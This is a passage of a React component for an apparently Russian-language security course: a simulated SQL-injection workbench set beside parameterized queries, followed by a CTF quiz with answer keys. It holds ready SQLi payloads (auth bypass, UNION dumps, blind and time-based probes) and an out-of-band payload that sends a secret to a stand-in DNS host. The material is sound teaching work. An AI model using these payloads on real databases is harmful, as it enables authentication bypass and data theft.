"use client";

import { useState } from "react";
import Link from "next/link";
import { ArrowUpRight, CheckCircle2, ShieldAlert, ShieldCheck, Terminal } from "lucide-react";

type SqliScenario = {
  id: string;
  badge: string;
  title: string;
  defaultInput: string;
  vulnerableSqlTemplate: (input: string) => string;
  parameterizedSql: string;
  boundParam: (input: string) => string;
  vulnerableResult: (input: string) => {
    leaked: boolean;
    status: string;
    rows: string[];
    explanation: string;
  };
  safeResult: (input: string) => {
    status: string;
    rows: string[];
    explanation: string;
  };
};

const SQLI_SCENARIOS: SqliScenario[] = [
  {
    id: "auth-bypass",
    badge: "Тип 1 · In-Band Auth Bypass",
    title: "Обход проверки пароля (' OR 1=1 --)",
    defaultInput: "admin' OR 1=1 --",
    vulnerableSqlTemplate: (u) =>
      `SELECT id, login, role FROM users WHERE login = '${u}' AND pass_hash = 'sha256_input';`,
    parameterizedSql:
      "SELECT id, login, role FROM users WHERE login = ? AND pass_hash = ?;",
    boundParam: (u) => `param_1 = ${JSON.stringify(u)}, param_2 = "sha256_input"`,
    vulnerableResult: (u) => {
      const triggered = /'\s*or\s+1\s*=\s*1/i.test(u) || /'\s*--/.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: вход выполнен без пароля (role=admin)",
            rows: ['{ id: 1, login: "admin", role: "superadmin", flag: "KRN{SQLI_AUTH_BYPASS}" }'],
            explanation:
              "Одиночная кавычка закрыла строковый литерал login, условие OR 1=1 сделало WHERE истинным, а комментарий -- отрезал проверку хеша пароля.",
          }
        : {
            leaked: false,
            status: "Запрос выполнен штатно (0 совпадений)",
            rows: [],
            explanation:
              "Без закрывающей кавычки и комментария СУБД проверила оба условия login и pass_hash.",
          };
    },
    safeResult: (u) => ({
      status: "ЗАЩИЩЕНО (Prepared Statement): 0 строк",
      rows: [],
      explanation: `Драйвер СУБД передал строку ${JSON.stringify(u)} отдельно от скомпилированного плана SQL. База искала пользователя с буквальным именем из 16 символов, включая кавычку и дефисы.`,
    }),
  },
  {
    id: "union-select",
    badge: "Тип 2 · In-Band UNION SELECT",
    title: "Слияние с системной таблицей (UNION SELECT из sqlite_master / secret_vault)",
    defaultInput: "phone' UNION SELECT id, username, api_secret FROM staff_tokens --",
    vulnerableSqlTemplate: (u) =>
      `SELECT id, title, price FROM products WHERE category = '${u}';`,
    parameterizedSql:
      "SELECT id, title, price FROM products WHERE category = ?;",
    boundParam: (u) => `param_1 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /union\s+select/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: к списку товаров приклеены строки чужой таблицы",
            rows: [
              '{ col1: 1, col2: "sec_lead", col3: "KRN{UNION_SELECT_3_COLS}" }',
              '{ col1: 2, col2: "deploy_bot", col3: "tok_prod_99812a" }',
            ],
            explanation:
              "Так как в обоих SELECT ровно по 3 столбца, оператор UNION объединил вывод каталога товаров с секретной таблицей staff_tokens.",
          }
        : {
            leaked: false,
            status: "Обычный поиск по категории",
            rows: ['{ col1: 10, col2: "USB-C Adapter", col3: "19 USD" }'],
            explanation: "Оператор UNION не обнаружен в строке запроса.",
          };
    },
    safeResult: () => ({
      status: "ЗАЩИЩЕНО (Prepared Statement): 0 товаров в такой категории",
      rows: [],
      explanation:
        "В параметризованном запросе ключевые слова UNION SELECT внутри параметра ? не могут создать второй оператор SELECT в дереве разбора SQL.",
    }),
  },
  {
    id: "error-based",
    badge: "Тип 3 · Error-Based SQLi",
    title: "Извлечение секрета через текст ошибки приведения типов (CAST AS INT)",
    defaultInput: "1' AND 1=CAST((SELECT flag FROM vault LIMIT 1) AS INT) --",
    vulnerableSqlTemplate: (u) =>
      `SELECT title FROM articles WHERE id = '${u}';`,
    parameterizedSql: "SELECT title FROM articles WHERE id = ?;",
    boundParam: (u) => `param_1 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /cast\s*\(/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: секрет выведен в диагностическом сообщении СУБД",
            rows: [
              'ERROR 22P02: invalid input syntax for type integer: "KRN{ERROR_BASED_CAST_LEAK}"',
            ],
            explanation:
              "Подзапрос прочитал строку флага и попытался преобразовать её в число INT. СУБД прервала операцию и напечатала само строковое значение в тексте ошибки!",
          }
        : {
            leaked: false,
            status: "Запрос без ошибки приведения типов",
            rows: [],
            explanation: "Оператор принудительного приведения типов CAST не вызван.",
          };
    },
    safeResult: () => ({
      status: "ЗАЩИЩЕНО (Prepared Statement + скрытие сырых ошибок СУБД)",
      rows: [],
      explanation:
        "Подзапрос внутри ? не исполняется, а клиенту возвращается только стандартный ответ 404/400 без внутреннего стектрейса БД.",
    }),
  },
  {
    id: "boolean-blind",
    badge: "Тип 4 · Boolean-Based Blind SQLi",
    title: "Слепая булева инъекция: бинарный поиск по коду символа (ASCII / UNICODE > 74)",
    defaultInput: "coupon10' AND UNICODE(SUBSTR((SELECT secret FROM vault),1,1)) > 74 --",
    vulnerableSqlTemplate: (u) =>
      `SELECT 1 FROM coupons WHERE code = '${u}' LIMIT 1;`,
    parameterizedSql: "SELECT 1 FROM coupons WHERE code = ? LIMIT 1;",
    boundParam: (u) => `param_1 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /substr/i.test(u) || /unicode|ascii/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: булев оракул вернул TRUE (код 1-го символа 'K' = 75 > 74)",
            rows: [
              'HTTP 200: {"coupon_valid": true} -> Бинарный поиск за 7 шагов на символ восстанавливает "KRN{BLIND_BOOL_7STEPS}"',
            ],
            explanation:
              "Даже когда сайт не выводит ни одной строки из базы, разница между ответами «Купон найден (true)» и «Не найден (false)» позволяет за 7 запросов угадать каждый символ!",
          }
        : {
            leaked: false,
            status: 'HTTP 200: {"coupon_valid": false}',
            rows: [],
            explanation: "Булево условие подзапроса не задано.",
          };
    },
    safeResult: () => ({
      status: 'ЗАЩИЩЕНО (Prepared Statement): {"coupon_valid": false}',
      rows: [],
      explanation:
        "Функции UNICODE() и SUBSTR() внутри строкового параметра не вызываются движком SQL.",
    }),
  },
  {
    id: "time-blind",
    badge: "Тип 5 · Time-Based Blind SQLi",
    title: "Слепая временная инъекция: ответ через задержку (pg_sleep / SLEEP / WAITFOR)",
    defaultInput: "1'; SELECT CASE WHEN (SUBSTR(secret,1,3)='KRN') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM vault --",
    vulnerableSqlTemplate: (u) =>
      `INSERT INTO audit_ping (client_tag) VALUES ('${u}');`,
    parameterizedSql: "INSERT INTO audit_ping (client_tag) VALUES ($1);",
    boundParam: (u) => `$1 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /sleep|waitfor|randomblob/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: время ответа сервера составило 3012 мс (условие ИСТИННО)",
            rows: [
              'Timing Delta: 3012 ms >= 3000 ms -> Префикс подтверждён: "KRN{TIME_CHANNEL_OK}"',
            ],
            explanation:
              "Страница всегда возвращает одинаковый пустой ответ 200 OK, но условный вызов pg_sleep(3) задержал HTTP-ответ ровно на 3 секунды.",
          }
        : {
            leaked: false,
            status: "Время ответа: 8 мс",
            rows: [],
            explanation: "Команда временной задержки не сработала.",
          };
    },
    safeResult: () => ({
      status: "ЗАЩИЩЕНО (Prepared Statement): время ответа 6 мс",
      rows: [],
      explanation:
        "Вся строка целиком записана как текст поля client_tag за 6 мс без вызова функций задержки СУБД.",
    }),
  },
  {
    id: "second-order",
    badge: "Тип 6 · Second-Order SQLi",
    title: "Отложенная инъекция второго порядка (профиль 'admin\\' --' при смене пароля)",
    defaultInput: "admin' --",
    vulnerableSqlTemplate: (u) =>
      `-- Шаг 2 (чтение логина из БД и склейка UPDATE):\nUPDATE users SET pass_hash = 'NEW_ATTACKER_HASH' WHERE login = '${u}' AND active = 1;`,
    parameterizedSql:
      "UPDATE users SET pass_hash = ? WHERE login = ? AND active = 1;",
    boundParam: (u) => `param_1 = "NEW_ATTACKER_HASH", param_2 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /admin'\s*--/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: перезаписан пароль настоящего администратора 'admin'!",
            rows: [
              'Updated row: login="admin" (вместо "admin\' --") -> Флаг: "KRN{SECOND_ORDER_SQLI}"',
            ],
            explanation:
              "При регистрации имя admin' -- было безопасно вставлено через ?, но в обработчике смены пароля разработчик доверился данным из собственной таблицы и склеил запрос UPDATE вручную!",
          }
        : {
            leaked: false,
            status: "Обновлён только профиль текущего пользователя",
            rows: [],
            explanation: "В сохранённом имени нет кавычки и комментария.",
          };
    },
    safeResult: (u) => ({
      status: `ЗАЩИЩЕНО: обновлён строго профиль пользователя ${JSON.stringify(u)}`,
      rows: [' Account "admin" remained untouched (HASH_ORIG_ADMIN) '],
      explanation:
        "Параметризация используется в каждом запросе — в том числе для данных, ранее прочитанных из самой базы данных.",
    }),
  },
  {
    id: "oob-exfil",
    badge: "Тип 7 · Out-of-Band (OOB) SQLi",
    title: "Внеполосная выгрузка через DNS/HTTP-запрос СУБД (COPY / xp_dirtree / UTL_HTTP)",
    defaultInput: "1'; COPY (SELECT secret FROM vault) TO PROGRAM 'nslookup $SECRET.oob.kairon.local' --",
    vulnerableSqlTemplate: (u) =>
      `SELECT status FROM jobs WHERE job_id = '${u}';`,
    parameterizedSql: "SELECT status FROM jobs WHERE job_id = $1;",
    boundParam: (u) => `$1 = ${JSON.stringify(u)}`,
    vulnerableResult: (u) => {
      const triggered = /copy\s*\(|xp_dirtree|utl_http|load_file/i.test(u);
      return triggered
        ? {
            leaked: true,
            status: "УЯЗВИМОСТЬ СРАБОТАЛА: перехвачен DNS-запрос от сервера СУБД",
            rows: [
              'DNS Query received: KRN-OOB-DNS-EXFIL.oob.kairon.local (A)',
            ],
            explanation:
              "Когда веб-ответ полностью асинхронный и не даёт даже временного отклика, привилегированные функции СУБД инициируют сетевое обращение к внешнему DNS-коллектору.",
          }
        : {
            leaked: false,
            status: "Внешних обращений СУБД не зафиксировано",
            rows: [],
            explanation: "Функции сетевого/файлового вывода СУБД не вызваны.",
          };
    },
    safeResult: () => ({
      status: "ЗАЩИЩЕНО (Prepared Statement + минимальные привилегии учётной записи БД + запрет Egress)",
      rows: [],
      explanation:
        "Плейсхолдер $1 блокирует разрыв команды, а сетевой экран запрещает серверу БД исходящие обращения в интернет.",
    }),
  },
];

type CtfChallenge = {
  id: string;
  sourceBadge: string;
  sourceUrl: string;
  title: string;
  task: string;
  hint: string;
  options: { id: string; label: string; isCorrect: boolean; feedback: string }[];
  flag: string;
  lessonHref: string;
};

const CTF_CHALLENGES: CtfChallenge[] = [
  {
    id: "ctf-sqli-union",
    sourceBadge: "pwn.college CTF Archive · Web SQLi",
    sourceUrl: "https://pwn.college/ctf-archive",
    title: "Задача 1: Подбор числа столбцов и выгрузка схемы в UNION SELECT",
    task: "При проверке параметра ?cat=books запрос ' ORDER BY 3 -- возвращает страницу товаров, а ' ORDER BY 4 -- вызывает ошибку СУБД. Какой запрос корректно выгрузит имена таблиц и структуру из sqlite_master?",
    hint: "Количество выбираемых выражений после UNION SELECT должно строго равняться последнему успешному номеру в ORDER BY (то есть 3).",
    options: [
      {
        id: "a",
        label: "books' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --",
        isCorrect: true,
        feedback:
          "Верно! В исходном запросе ровно 3 столбца (ORDER BY 3 прошёл, а 4 упал), поэтому UNION SELECT 1, name, sql передаёт ровно 3 поля и выводит схему скрытых таблиц.",
      },
      {
        id: "b",
        label: "books' UNION SELECT name, sql FROM sqlite_master --",
        isCorrect: false,
        feedback:
          "Здесь после UNION SELECT указано только 2 столбца, а в левом запросе их 3 — СУБД вернёт ошибку несовпадения размерности.",
      },
      {
        id: "c",
        label: "books' OR 1=1",
        isCorrect: false,
        feedback:
          "OR 1=1 покажет только все строки текущей таблицы товаров, но не прочитает системный каталог sqlite_master.",
      },
    ],
    flag: "KRN{UNION_3_COLS_SCHEMA}",
    lessonHref: "/learn/pwn-sqli-union-error-schema-extraction",
  },
  {
    id: "ctf-injection-dojo",
    sourceBadge: "github.com/pwncollege/injection-dojo",
    sourceUrl: "https://github.com/pwncollege/injection-dojo",
    title: "Задача 2: Защита четырёх форматов (CSV, YAML, JSON, XML)",
    task: "В репозитории pwncollege/injection-dojo разбираются инъекции в CSV, YAML, JSON и XML. Какая комбинация защитных мер полностью закрывает выполнение кода в YAML и перезапись ролей через дубликаты ключей в JSON?",
    hint: "Вспомни разницу между yaml.load и yaml.safe_load, а также параметр object_pairs_hook в json.loads.",
    options: [
      {
        id: "a",
        label: "Использовать yaml.safe_load() вместо yaml.load(), собирать JSON через json.dumps() и отклонять повтор ключей через object_pairs_hook.",
        isCorrect: true,
        feedback:
          "Точно! yaml.safe_load() блокирует конструирование произвольных Python-объектов (!!python/object/apply), а object_pairs_hook предотвращает рассинхронизацию парсеров при дублирующихся ключах.",
      },
      {
        id: "b",
        label: "Удалять пробелы перед вызовом yaml.load() и склеивать JSON через f-строки.",
        isCorrect: false,
        feedback:
          "Удаление пробелов не мешает тегу !!python/object/apply, а склейка JSON через f-строки как раз и позволяет вставить второй ключ role.",
      },
    ],
    flag: "KRN{INJECTION_DOJO_GUARDED}",
    lessonHref: "/learn/pwn-injection-dojo-csv-yaml-json-xml",
  },
  {
    id: "ctf-archive-rev",
    sourceBadge: "github.com/pwncollege/ctf-archive · Reversing",
    sourceUrl: "https://github.com/pwncollege/ctf-archive",
    title: "Задача 3: Обращение побайтового шифратора флага (XOR -> ROL8 -> ADD)",
    task: "Функция check_flag() в бинарнике CTF к каждому байту применяет: 1) XOR с 0x33, 2) циклический сдвиг влево ROL8 на 3 бита, 3) прибавление 0x29 по модулю 256. В каком порядке должен работать скрипт-решатель над массивом из .rodata?",
    hint: "Обращение композиции операций всегда выполняется от последнего действия к первому: (f ∘ g ∘ h)⁻¹ = h⁻¹ ∘ g⁻¹ ∘ f⁻¹.",
    options: [
      {
        id: "a",
        label: "Сначала вычесть 0x29 (mod 256), затем выполнить циклический сдвиг вправо ROR8 на 3 бита, затем применить XOR с 0x33.",
        isCorrect: true,
        feedback:
          "Безупречно! Обратные операции применяются строго в обратном порядке: SUB 0x29 -> ROR8(..., 3) -> XOR 0x33.",
      },
      {
        id: "b",
        label: "Сначала сделать XOR с 0x33, затем обычный сдвиг >> 3 и вычесть 0x29.",
        isCorrect: false,
        feedback:
          "Обычный сдвиг >> 3 теряет младшие биты, и порядок операций здесь перепутан.",
      },
    ],
    flag: "KRN{REVERSE_PIPELINE_SOLVED}",
    lessonHref: "/learn/pwn-ctf-archive-reversing-keygen-solver",
  },
  {
    id: "ctf-dc33-race",
    sourceBadge: "github.com/pwncollege/dc33-dca-dojo · DEF CON 33",
    sourceUrl: "https://github.com/pwncollege/dc33-dca-dojo",
    title: "Задача 4: DEF CON 33 DCA — закрытие гонки TOCTOU при погашении токена",
    task: "В модуле dc33-race-against-the-machine два одновременных HTTP-запроса успевают пройти проверку SELECT used FROM coupons WHERE code=? до того, как выполнится UPDATE. Как исправить запрос в БД?",
    hint: "Проверка условия used = 0 и изменение его на 1 должны происходить в одной неделимой (атомарной) инструкции UPDATE.",
    options: [
      {
        id: "a",
        label: "Выполнить единый запрос UPDATE coupons SET used = 1 WHERE code = ? AND used = 0 и проверить, что cursor.rowcount == 1.",
        isCorrect: true,
        feedback:
          "Верно! Атомарный условный UPDATE берёт блокировку строки внутри СУБД и гарантирует, что ровно один поток получит rowcount == 1.",
      },
      {
        id: "b",
        label: "Добавить time.sleep(0.1) перед вызовом SELECT.",
        isCorrect: false,
        feedback:
          "Задержка не делает операцию атомарной — наоборот, она расширяет временное окно для параллельных потоков.",
      },
    ],
    flag: "KRN{DC33_ATOMIC_UPDATE}",
    lessonHref: "/learn/pwn-ctf-dc33-dca-deceit-race-legion",
  },
  {
    id: "ctf-wstg-audit",
    sourceBadge: "OWASP WSTG & PayloadsAllTheThings",
    sourceUrl: "https://github.com/swisskyrepo/PayloadsAllTheThings",
    title: "Задача 5: Комплексная защита от NoSQLi ($ne), XXE и обхода загрузки файлов",
    task: "Какой набор проверок одновременно блокирует операторную инъекцию {'$ne': null} в MongoDB, чтение /etc/passwd через XML <!ENTITY> и запуск веб-шелла через картинку-полиглот avatar.php.png?",
    hint: "Проверь тип входного параметра (str vs dict), запрет DOCTYPE/DTD в XML и перекодирование изображения с сохранением под случайным UUID вне корня веб-сервера.",
    options: [
      {
        id: "a",
        label: "Строгая проверка типа isinstance(val, str), отключение DTD/внешних сущностей в XML-парсере, проверка Magic Bytes + пересохранение под новым UUID вне Web Root.",
        isCorrect: true,
        feedback:
          "Отлично! Все три класса уязвимостей из OWASP WSTG и PayloadsAllTheThings закрыты на архитектурном уровне.",
      },
      {
        id: "b",
        label: "Проверка заголовка Content-Type из браузера и удаление подстроки '../' один раз.",
        isCorrect: false,
        feedback:
          "Заголовок Content-Type легко подделывается клиентом, а однократное удаление '../' обходится строкой '....//'.",
      },
    ],
    flag: "KRN{WSTG_PAYLOADS_MASTERED}",
    lessonHref: "/learn/thm-htb-wstg-fileupload-magic-polyglot-lfi",
  },
];

const EXTERNAL_CTF_PLATFORMS = [
  {
    name: "pwn.college CTF Archive (Живой полигон)",
    url: "https://pwn.college/ctf-archive",
    repoUrl: "https://github.com/pwncollege/ctf-archive",
    tag: "Соревнования CTF в браузере",
    desc: "Сотни реальных задач с турниров DEF CON Quals, CSAW, 0CTF, DiceCTF, UIUCTF и BuckeyeCTF с запуском контейнера прямо на сайте pwn.college.",
    kaironDayHref: "/days/112",
    kaironDayLabel: "Перейти к разбору на Kairon (День 112) →",
  },
  {
    name: "pwn.college Content Injection Dojo",
    url: "https://github.com/pwncollege/injection-dojo",
    repoUrl: "https://pwn.college/dojos",
    tag: "CSV · YAML · JSON · XML · SQL",
    desc: "Специализированный практикум pwn.college по инъекциям в форматы сериализации, конфигурационные файлы и запросы к базам данных.",
    kaironDayHref: "/days/110",
    kaironDayLabel: "Перейти к разбору на Kairon (День 110) →",
  },
  {
    name: "DEF CON 33 DCA & ACSAC CTF Dojos",
    url: "https://github.com/pwncollege/dc33-dca-dojo",
    repoUrl: "https://github.com/pwncollege/acsac-ctf-dojo",
    tag: "DEF CON 33 & ACSAC",
    desc: "Модули Byte-Sized Basics, Deceit by Design, Race Against the Machine, Linux Legion и прикладные криптографические задачи.",
    kaironDayHref: "/days/113",
    kaironDayLabel: "Перейти к разбору на Kairon (День 113) →",
  },
  {
    name: "PayloadsAllTheThings (Справочник веб-проверок · 82k+ ★)",
    url: "https://github.com/swisskyrepo/PayloadsAllTheThings",
    repoUrl: "https://github.com/OWASP/wstg",
    tag: "82 000+ ★ · Все векторы и обходы",
    desc: "Крупнейший открытый справочник тестовых векторов для проверки веб-приложений (SQLi, NoSQLi, XXE, SSRF, SSTI, JWT, OAuth, GraphQL) в связке со стандартом OWASP WSTG.",
    kaironDayHref: "/days/109",
    kaironDayLabel: "Перейти к разбору на Kairon (Дни 109–111) →",
  },
  {
    name: "TryHackMe & Hack The Box Academy",
    url: "https://tryhackme.com",
    repoUrl: "https://academy.hackthebox.com",
    tag: "Red Team · Blue Team · SOC · AD",
    desc: "Лаборатории по Active Directory, Kerberos, AD CS, повышению привилегий Linux/Windows, пивотингу, Docker/K8s, Volatility 3, AMSI/ETW и плейбукам SOAR.",
    kaironDayHref: "/days/97",
    kaironDayLabel: "Перейти к разбору на Kairon (Дни 97–108) →",
  },
  {
    name: "pwn.college Hacker History & Oldschool",
    url: "https://github.com/pwncollege/hacker-history-dojo",
    repoUrl: "https://github.com/pwncollege/oldschool",
    tag: "История эксплойтов и комплексный аудит",
    desc: "Реконструкция исторических уязвимостей (червь Морриса 1988, OpenSSL Heartbleed) и финальный конвейер проверки безопасности.",
    kaironDayHref: "/days/114",
    kaironDayLabel: "Перейти к разбору на Kairon (День 114) →",
  },
];

export function CtfSqliWorkbench() {
  const [selectedSqliId, setSelectedSqliId] = useState<string>(SQLI_SCENARIOS[0].id);
  const [customInputs, setCustomInputs] = useState<Record<string, string>>({});
  const [defenseMode, setDefenseMode] = useState<"vulnerable" | "parameterized">("vulnerable");
  const [selectedAnswers, setSelectedAnswers] = useState<Record<string, string>>({});

  const activeScenario =
    SQLI_SCENARIOS.find((s) => s.id === selectedSqliId) ?? SQLI_SCENARIOS[0];
  const currentInput = customInputs[activeScenario.id] ?? activeScenario.defaultInput;
  const vulnOutcome = activeScenario.vulnerableResult(currentInput);
  const safeOutcome = activeScenario.safeResult(currentInput);

  const solvedCount = CTF_CHALLENGES.filter((ch) => {
    const picked = selectedAnswers[ch.id];
    return ch.options.some((o) => o.id === picked && o.isCorrect);
  }).length;

  return (
    <section
      className="tool-course-feature"
      aria-label="Интерактивный полигон SQL-инъекций и CTF-задач"
      id="ctf-sqli-arena"
    >
      <span className="eyebrow">
        ИНТЕРАКТИВНЫЙ ПОЛИГОН ПРЯМО НА САЙТЕ · ВСЕ 7 ВИДОВ SQLi И ЗАДАЧИ CTF
      </span>
      <h2>Проверь все виды SQL-инъекций и реши задачи pwn.college CTF / OWASP WSTG</h2>
      <p>
        Здесь ты можешь вживую протестировать все 7 семейств SQL-инъекций
        (прямые <code>Auth Bypass</code> и <code>UNION SELECT</code>, вывод через ошибку{" "}
        <code>Error-Based</code>, слепые <code>Boolean-Based</code> и{" "}
        <code>Time-Based Blind</code>, отложенные <code>Second-Order</code> и
        внеполосные <code>Out-of-Band</code>), сравнить уязвимую склейку строк с
        параметризованным запросом <code>Prepared Statement (? / $1)</code>, пройти
        встроенные проверочные тесты CTF и сразу перейти к полным урокам или
        внешним стендам.
      </p>

      <div style={{ marginTop: "1.25rem", marginBottom: "1.5rem" }}>
        <h3>1. Интерактивный стенд: все 7 видов SQL-инъекций и параметризация</h3>
        <div
          style={{
            display: "flex",
            flexWrap: "wrap",
            gap: "0.5rem",
            marginTop: "0.75rem",
            marginBottom: "1rem",
          }}
        >
          {SQLI_SCENARIOS.map((item) => (
            <button
              key={item.id}
              type="button"
              onClick={() => setSelectedSqliId(item.id)}
              style={{
                padding: "0.45rem 0.75rem",
                borderRadius: "0.5rem",
                border:
                  item.id === activeScenario.id
                    ? "1px solid var(--accent, #5eead4)"
                    : "1px solid rgba(148, 163, 184, 0.28)",
                background:
                  item.id === activeScenario.id
                    ? "rgba(45, 212, 191, 0.14)"
                    : "rgba(15, 23, 42, 0.65)",
                color: "inherit",
                cursor: "pointer",
                fontSize: "0.88rem",
                textAlign: "left",
              }}
            >
              {item.badge}
            </button>
          ))}
        </div>

        <div
          style={{
            padding: "1rem",
            borderRadius: "0.75rem",
            border: "1px solid rgba(148, 163, 184, 0.25)",
            background: "rgba(10, 17, 26, 0.75)",
          }}
        >
          <div
            style={{
              display: "flex",
              flexWrap: "wrap",
              justifyContent: "space-between",
              alignItems: "center",
              gap: "0.75rem",
              marginBottom: "0.75rem",
            }}
          >
            <strong>{activeScenario.title}</strong>
            <div style={{ display: "flex", flexWrap: "wrap", gap: "0.5rem" }}>
              <button
                type="button"
                onClick={() => setDefenseMode("vulnerable")}
                style={{
                  padding: "0.35rem 0.7rem",
                  borderRadius: "0.4rem",
                  border:
                    defenseMode === "vulnerable"
                      ? "1px solid #f87171"
                      : "1px solid rgba(148, 163, 184, 0.3)",
                  background:
                    defenseMode === "vulnerable"
                      ? "rgba(239, 68, 68, 0.18)"
                      : "transparent",
                  color: "inherit",
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                Режим 1: Уязвимая склейка (f-string)
              </button>
              <button
                type="button"
                onClick={() => setDefenseMode("parameterized")}
                style={{
                  padding: "0.35rem 0.7rem",
                  borderRadius: "0.4rem",
                  border:
                    defenseMode === "parameterized"
                      ? "1px solid #34d399"
                      : "1px solid rgba(148, 163, 184, 0.3)",
                  background:
                    defenseMode === "parameterized"
                      ? "rgba(16, 185, 129, 0.18)"
                      : "transparent",
                  color: "inherit",
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                Режим 2: Защищённый Prepared Statement (? / $1)
              </button>
            </div>
          </div>

          <label style={{ display: "block", marginBottom: "0.75rem" }}>
            <span style={{ display: "block", fontSize: "0.88rem", marginBottom: "0.3rem" }}>
              Входная строка пользователя (можно редактировать или сбросить к эталону):
            </span>
            <div style={{ display: "flex", flexWrap: "wrap", gap: "0.5rem" }}>
              <input
                type="text"
                value={currentInput}
                onChange={(e) =>
                  setCustomInputs((prev) => ({
                    ...prev,
                    [activeScenario.id]: e.target.value,
                  }))
                }
                style={{
                  flex: "1 1 260px",
                  minWidth: 0,
                  padding: "0.5rem 0.7rem",
                  borderRadius: "0.4rem",
                  border: "1px solid rgba(148, 163, 184, 0.35)",
                  background: "rgba(15, 23, 42, 0.9)",
                  color: "inherit",
                  fontFamily: "monospace",
                  fontSize: "0.88rem",
                }}
              />
              <button
                type="button"
                onClick={() =>
                  setCustomInputs((prev) => ({
                    ...prev,
                    [activeScenario.id]: activeScenario.defaultInput,
                  }))
                }
                style={{
                  padding: "0.45rem 0.75rem",
                  borderRadius: "0.4rem",
                  border: "1px solid rgba(148, 163, 184, 0.35)",
                  background: "rgba(30, 41, 59, 0.7)",
                  color: "inherit",
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                Вернуть пример атаки
              </button>
            </div>
          </label>

          {defenseMode === "vulnerable" ? (
            <div>
              <p style={{ fontSize: "0.88rem", marginBottom: "0.3rem" }}>
                <Terminal size={15} style={{ display: "inline", marginRight: "0.35rem" }} />
                Сформированный SQL-запрос на сервере (конкатенация текста):
              </p>
              <pre style={{ overflowX: "auto", marginBottom: "0.75rem" }}>
                <code>{activeScenario.vulnerableSqlTemplate(currentInput)}</code>
              </pre>
              <p
                style={{
                  fontWeight: 600,
                  color: vulnOutcome.leaked ? "#fca5a5" : "#fde68a",
                  marginBottom: "0.4rem",
                }}
              >
                <ShieldAlert
                  size={16}
                  style={{ display: "inline", marginRight: "0.35rem" }}
                />
                {vulnOutcome.status}
              </p>
              {vulnOutcome.rows.length > 0 && (
                <pre style={{ overflowX: "auto", marginBottom: "0.5rem" }}>
                  <code>{vulnOutcome.rows.join("\n")}</code>
                </pre>
              )}
              <p style={{ margin: 0, fontSize: "0.92rem" }}>{vulnOutcome.explanation}</p>
            </div>
          ) : (
            <div>
              <p style={{ fontSize: "0.88rem", marginBottom: "0.3rem" }}>
                <Terminal size={15} style={{ display: "inline", marginRight: "0.35rem" }} />
                Скомпилированный шаблон SQL и отдельно связанный параметр:
              </p>
              <pre style={{ overflowX: "auto", marginBottom: "0.75rem" }}>
                <code>
                  {activeScenario.parameterizedSql + "\n-- " + activeScenario.boundParam(currentInput)}
                </code>
              </pre>
              <p style={{ fontWeight: 600, color: "#6ee7b7", marginBottom: "0.4rem" }}>
                <ShieldCheck
                  size={16}
                  style={{ display: "inline", marginRight: "0.35rem" }}
                />
                {safeOutcome.status}
              </p>
              {safeOutcome.rows.length > 0 && (
                <pre style={{ overflowX: "auto", marginBottom: "0.5rem" }}>
                  <code>{safeOutcome.rows.join("\n")}</code>
                </pre>
              )}
              <p style={{ margin: 0, fontSize: "0.92rem" }}>{safeOutcome.explanation}</p>
            </div>
          )}
        </div>
      </div>

      <div style={{ marginTop: "1.75rem", marginBottom: "1.5rem" }}>
        <div
          style={{
            display: "flex",
            flexWrap: "wrap",
            justifyContent: "space-between",
            alignItems: "center",
            gap: "0.5rem",
            marginBottom: "0.75rem",
          }}
        >
          <h3 style={{ margin: 0 }}>
            2. Встроенные проверочные тесты CTF и аудита веб-приложений
          </h3>
          <span className="muted-tag">
            Решено задач: {solvedCount} из {CTF_CHALLENGES.length}
          </span>
        </div>

        <div style={{ display: "grid", gap: "1rem" }}>
          {CTF_CHALLENGES.map((challenge) => {
            const chosenId = selectedAnswers[challenge.id];
            const chosenOpt = challenge.options.find((o) => o.id === chosenId);
            return (
              <article
                key={challenge.id}
                style={{
                  padding: "1rem",
                  borderRadius: "0.75rem",
                  border: "1px solid rgba(148, 163, 184, 0.25)",
                  background: "rgba(10, 17, 26, 0.65)",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    flexWrap: "wrap",
                    justifyContent: "space-between",
                    gap: "0.5rem",
                    marginBottom: "0.4rem",
                  }}
                >
                  <span className="eyebrow">{challenge.sourceBadge}</span>
                  <a
                    href={challenge.sourceUrl}
                    target="_blank"
                    rel="noreferrer"
                    className="subtle-link"
                    style={{ fontSize: "0.84rem" }}
                  >
                    Открыть первоисточник <ArrowUpRight size={14} />
                  </a>
                </div>
                <h4 style={{ marginTop: "0.2rem", marginBottom: "0.45rem" }}>
                  {challenge.title}
                </h4>
                <p style={{ marginBottom: "0.5rem", fontSize: "0.93rem" }}>
                  {challenge.task}
                </p>
                <p
                  style={{
                    fontSize: "0.84rem",
                    opacity: 0.85,
                    marginBottom: "0.75rem",
                  }}
                >
                  Подсказка: {challenge.hint}
                </p>

                <div style={{ display: "grid", gap: "0.45rem", marginBottom: "0.75rem" }}>
                  {challenge.options.map((opt) => {
                    const isSelected = chosenId === opt.id;
                    return (
                      <button
                        key={opt.id}
                        type="button"
                        onClick={() =>
                          setSelectedAnswers((prev) => ({
                            ...prev,
                            [challenge.id]: opt.id,
                          }))
                        }
                        style={{
                          padding: "0.55rem 0.75rem",
                          borderRadius: "0.45rem",
                          border: isSelected
                            ? opt.isCorrect
                              ? "1px solid #34d399"
